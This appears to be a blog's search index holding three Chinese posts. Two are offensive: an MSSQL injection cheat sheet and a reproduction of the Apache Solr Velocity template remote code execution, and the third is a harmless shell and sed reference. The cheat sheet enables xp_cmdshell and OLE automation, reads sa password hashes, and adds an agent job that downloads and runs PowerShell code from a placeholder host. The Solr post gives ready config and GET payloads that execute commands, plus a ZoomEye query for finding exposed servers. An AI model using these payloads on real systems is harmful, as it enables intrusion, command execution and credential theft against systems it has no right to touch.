<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>手工SQLi语句备忘录</title>
      <link href="2021/05/31/%E6%89%8B%E5%B7%A5SQLi%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2021/05/31/%E6%89%8B%E5%B7%A5SQLi%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="手工SQLi语句备忘录"><a href="#手工SQLi语句备忘录" class="headerlink" title="手工SQLi语句备忘录"></a>手工SQLi语句备忘录</h1><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><h3 id="获取数据库数量"><a href="#获取数据库数量" class="headerlink" title="获取数据库数量"></a>获取数据库数量</h3><p><code>select count(name) from master..sysdatabases;</code></p><h3 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h3><p><code>select name from master..sysdatabases;</code><br><code>select DB_NAME(i);</code></p><h3 id="查询表数量"><a href="#查询表数量" class="headerlink" title="查询表数量"></a>查询表数量</h3><p><code>SELECT count(name) FROM master..sysobjects where xtype =&#39;u&#39;;</code></p><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><code>select name from master..sysobjects where xtype=&#39;U&#39;;</code>  </p><h3 id="查询列名数量"><a href="#查询列名数量" class="headerlink" title="查询列名数量"></a>查询列名数量</h3><p><code>SELECT COUNT(name) FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;model&#39;);</code></p><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p><code>SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;tablename&#39;);</code> </p><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code>CREATE TABLE mydata (line varchar(8000));BULK INSERT mydata FROM &quot;c:/exp.txt&quot;;SELECT * FROM mydata;DROP TABLE mydata;</code></pre><h3 id="cmdshell确认"><a href="#cmdshell确认" class="headerlink" title="cmdshell确认"></a>cmdshell确认</h3><p><code>select count(*) from master..sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;;</code></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><ol><li>启用cmdshell<br><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></li><li>执行命令<br><code>EXEC master.dbo.xp_cmdshell &quot;whoami&quot;;</code></li></ol><h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><ol><li>开启sp_oacreate <pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;   RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;show advanced options&#39;, 0;</code></pre></li><li>执行命令<br><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\\1.txt&#39;</code></li></ol><h5 id="使用sp-oacreate执行文件操作"><a href="#使用sp-oacreate执行文件操作" class="headerlink" title="使用sp_oacreate执行文件操作"></a>使用sp_oacreate执行文件操作</h5><ul><li>复制文件<br><code>DECLARE @o INT EXEC sp_oacreate &#39;scripting.filesystemobject&#39;, @o out exec sp_oamethod @o, &#39;copyfile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;;</code></li><li>删除文件<br><code>DECLARE @d INT DECLARE @FSO_Token INT EXEC @d=sp_oacreate &#39;scripting.filesystemobject&#39;,@FSO_Token OUTPUT EXEC @d=sp_oamethod @FSO_Token, &#39;deletefile&#39;,null,&#39;c:\2.txt&#39; EXEC @d = sp_oadestroy @FSO_Token</code></li><li>移动文件<br><code>DECLARE @m INT EXEC sp_oacreate &#39;scripting.filesystemobject&#39;,@m OUT EXEC sp_oamethod @m, &#39;movefile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;</code></li></ul><h4 id="agent-job"><a href="#agent-job" class="headerlink" title="agent job"></a>agent job</h4><pre><code>USE msdb;EXEC dbo.sp_add_job @job_name = N&#39;clay_powershell_job1&#39; ; EXEC sp_add_jobstep     @job_name = N&#39;clay_powershell_job1&#39;,     @step_name = N&#39;clay_powershell_name1&#39;,     @subsystem = N&#39;PowerShell&#39;,     @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://Your_IP/Your_file&#39;&#39;))&quot;&#39;,     @retry_attempts = 1,     @retry_interval = 5;EXEC dbo.sp_add_jobserver     @job_name = N&#39;clay_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;clay_powershell_job1&#39;;</code></pre><h3 id="读取sa密码"><a href="#读取sa密码" class="headerlink" title="读取sa密码"></a>读取sa密码</h3><p><code>select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins</code></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="2021/05/13/shell%E8%84%9A%E6%9C%AC%E9%80%9F%E6%9F%A5/"/>
      <url>2021/05/13/shell%E8%84%9A%E6%9C%AC%E9%80%9F%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="shell脚本速查"><a href="#shell脚本速查" class="headerlink" title="shell脚本速查"></a>shell脚本速查</h2><p>title: shell脚本速查<br>date: 1620872846631<br>categories:</p><ul><li>Notes<br>tags:</li><li>shell</li></ul><hr><h1 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h1><pre><code>var=&quot;123&quot;`ls -al` == $(ls -al)echo $var === echo $&#123;var&#125;获取字符段长度length=$&#123;#string&#125;:&lt;&lt;EOF注释内容EOF关系运算符-eq    检测两个数是否相等，相等返回 true。    [ $a -eq $b ] 返回 false。-ne    检测两个数是否不相等，不相等返回 true。    [ $a -ne $b ] 返回 true。-gt    检测左边的数是否大于右边的，如果是，则返回 true。    [ $a -gt $b ] 返回 false。-lt    检测左边的数是否小于右边的，如果是，则返回 true。    [ $a -lt $b ] 返回 true。-ge    检测左边的数是否大于等于右边的，如果是，则返回 true。    [ $a -ge $b ] 返回 false。-le    检测左边的数是否小于等于右边的，如果是，则返回 true。    [ $a -le $b ] 返回 true。布尔运算符运算符!    非运算，表达式为 true 则返回 false，否则返回 true。    [ ! false ] 返回 true。-o    或运算，有一个表达式为 true 则返回 true。    [ $a -lt 20 -o $b -gt 100 ] 返回 true。-a    与运算，两个表达式都为 true 才返回 true。    [ $a -lt 20 -a $b -gt 100 ] 返回 false。字符串运算符运算符=    检测两个字符串是否相等，相等返回 true。    [ $a = $b ] 返回 false。!=    检测两个字符串是否不相等，不相等返回 true。    [ $a != $b ] 返回 true。-z    检测字符串长度是否为0，为0返回 true。    [ -z $a ] 返回 false。-n    检测字符串长度是否不为 0，不为 0 返回 true。    [ -n &quot;$a&quot; ] 返回 true。$    检测字符串是否为空，不为空返回 true。    [ $a ] 返回 true。文件测试运算符操作符-b file    检测文件是否是块设备文件，如果是，则返回 true。    [ -b $file ] 返回 false。-c file    检测文件是否是字符设备文件，如果是，则返回 true。    [ -c $file ] 返回 false。-d file    检测文件是否是目录，如果是，则返回 true。    [ -d $file ] 返回 false。-f file    检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。    [ -f $file ] 返回 true。-g file    检测文件是否设置了 SGID 位，如果是，则返回 true。    [ -g $file ] 返回 false。-k file    检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。    [ -k $file ] 返回 false。-p file    检测文件是否是有名管道，如果是，则返回 true。    [ -p $file ] 返回 false。-u file    检测文件是否设置了 SUID 位，如果是，则返回 true。    [ -u $file ] 返回 false。-r file    检测文件是否可读，如果是，则返回 true。    [ -r $file ] 返回 true。-w file    检测文件是否可写，如果是，则返回 true。    [ -w $file ] 返回 true。-x file    检测文件是否可执行，如果是，则返回 true。    [ -x $file ] 返回 true。-s file    检测文件是否为空（文件大小是否大于0），不为空返回 true。    [ -s $file ] 返回 true。-e file    检测文件（包括目录）是否存在，如果是，则返回 true。    [ -e $file ] 返回 true。将stdout和stderr重定向到filecommand &gt; file 2&gt;&amp;1屏蔽stdout和stderrcommand &gt; /dev/null 2&gt;&amp;1</code></pre><h1 id="sed使用"><a href="#sed使用" class="headerlink" title="sed使用"></a>sed使用</h1><h2 id="打印行"><a href="#打印行" class="headerlink" title="打印行"></a>打印行</h2><pre><code>sed -n -e &#39;/^root/ p&#39; /etc/passwd == sed -n &#39;&#123;/^root/ p&#125;&#39; /etc/passwd/^root/:root开头 /nobody$/:nobody结尾sed -n &#39;开始行,结束行 p&#39; FILE  开始行和结束行可以是行号也可以是关键字# 寻找包含Paul的行$sed -n &#39;/Paul/ p&#39; source.txt# 从第一行开始到第五行, 从找到开始打印到第五行$sed -n &#39;/Paul/,5 p&#39; source.txt# 从匹配Paul行打印达匹配Addy的行$sed -n &#39;/Paul/,/Addy/ p&#39; source.txt# 在freebsd版sed不能用 匹配Paul行再多输出2行$/usr/local/bin/sed -n &#39;/Paul/,+2 p&#39; source.txt</code></pre><h2 id="删除行"><a href="#删除行" class="headerlink" title="删除行"></a>删除行</h2><pre><code>删除全部行sed &#39;d&#39; source.txt 删除空行$sed &#39;/^$/ d&#39; source.txt删除评论行$sed &#39;/^#/ d&#39; source.txt</code></pre><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><pre><code>将内容重定向写到output.txtsed &#39;w output.txt&#39; source.txt将匹配到关键字的行写到output.txtsed -n &#39;/Ask/,$ w output.txt&#39;</code></pre><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><pre><code>sed &#39;[address-range|pattern-range] s/original-string/replacement-string/[substitute-flags]&#39; inputfile将Google替换为GitHubsed &#39;s/Google/Github/&#39; source.txt替换匹配Addy的行里面的Google为Githubsed &#39;/Addy/s/Google/Github/&#39; source.txtg可以替换每行的全部符合sed &#39;s/a/A/g&#39;  source.txt指定替换第二个匹配项sed &#39;s/a/A/2&#39;  source.txt替换指定内容给两边加上&lt;&gt;sed &#39;s/^.*/&lt;&amp;&gt;/&#39; FILE修改源文件sed -ised -ibak</code></pre><h2 id="行后增加"><a href="#行后增加" class="headerlink" title="行后增加"></a>行后增加</h2><pre><code>sed &#39;[address] a the-line-to-append&#39; input-filesed &#39;2 a 108,Donald Stufft, Nebula&#39; source.txt101,IAN Bicking,Mozilla102,Hakim El Hattab,Whim108,Donald Stufft, Nebula</code></pre><h2 id="行前插入语法"><a href="#行前插入语法" class="headerlink" title="行前插入语法"></a>行前插入语法</h2><pre><code>sed &#39;2 i 108,Donald Stufft, Nebula&#39; source.txt101,IAN Bicking,Mozilla108,Donald Stufft, Nebula102,Hakim El Hattab,Whim</code></pre><h2 id="修改行语法"><a href="#修改行语法" class="headerlink" title="修改行语法"></a>修改行语法</h2><pre><code>sed &#39;/Paul/ c 108,Donald Stufft, Nebula&#39; source.txt101,IAN Bicking,Mozilla102,Hakim El Hattab,Whim108,Donald Stufft, Nebula</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Solr Velocity模板远程代码执行漏洞复现</title>
      <link href="2019/11/01/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2019/11/01/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Apache-Solr描述"><a href="#Apache-Solr描述" class="headerlink" title="Apache Solr描述"></a>Apache Solr描述</h2><p>Solr（读作“solar”）是Apache Lucene项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。Solr是高度可扩展的，并提供了分布式搜索和索引复制。<br>Solr是用Java编写、运行在Servlet容器（如Apache Tomcat或Jetty）的一个独立的全文搜索服务器。 Solr采用了Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。 Solr强大的外部配置功能使得无需进行Java编码，便可对其进行调整以适应多种类型的应用程序。Solr有一个插件架构，以支持更多的高级定制。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>近日,国外安全研究员s00py公开了一个Apache Solr的Velocity模板注入的漏洞.该漏洞可以攻击最新版本的Solr.目前该漏洞利用详情已经广泛流传于Github以及各大安全群,且公开的EXP可以执行任意命令并自带回显.官方暂未发布补丁.</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>≤8.2.0(目前最新版本)</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>Apache Solr下载地址:<a href="https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip">solr-8.0.2.zip</a></li><li>基于docker:  <ol><li><code>docker pull solr</code>  </li><li><code>docker run --name my-solr -d -p 8983:8983 -t solr</code></li></ol></li><li>zoomeye:<br>  zoomeye搜索<code>port:8983 +app:&quot;Apache Solr&quot;</code><br>  <img src="http://img.osshell.com/20191101160658.png"><br>  图中可以看到HTTP显示的状态码为<code>302</code>状态码,这是由于solr默认访问ip后均会跳转到solr目录.<br>  打开后可以看到是正常的solr界面:<br>  <img src="http://img.osshell.com/20191101161114.png"></li></ul><h3 id="POC复测"><a href="#POC复测" class="headerlink" title="POC复测"></a>POC复测</h3><ol><li>首先我们要获取到solr的其中任意一个core名,可以通过以下两种方法:<ul><li>通过Logging报错</li><li>通过左下方的Core Selector<br><img src="http://img.osshell.com/20191101161537.png"></li></ul></li><li>获取core名称后访问<code>solr/core-name/config</code>确认config可以访问</li><li><img src="http://img.osshell.com/20191101161843.png"></li><li>向<code>solr/core-name/config</code>发送POST数据包,payload如下: </li></ol><pre><code class="json">&#123;  &quot;update-queryresponsewriter&quot;: &#123;    &quot;startup&quot;: &quot;lazy&quot;,    &quot;name&quot;: &quot;velocity&quot;,    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,    &quot;template.base.dir&quot;: &quot;&quot;,    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;  &#125;&#125;</code></pre><ol><li>查看<code>solr/core-name/config</code>确认<code>params.resource.loader.enabled</code>的值已经修改为<code>true</code></li><li>发送get请求执行命令,payload如下:<br> <code>/solr/merchant/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ls%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code><br> 命令执行成功返回结果:<br> <img src="http://img.osshell.com/20191101170730.png"></li></ol><h3 id="更多参考"><a href="#更多参考" class="headerlink" title="更多参考"></a>更多参考</h3><ol><li><a href="https://nosec.org/home/detail/3113.html">https://nosec.org/home/detail/3113.html</a></li><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Exploits </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
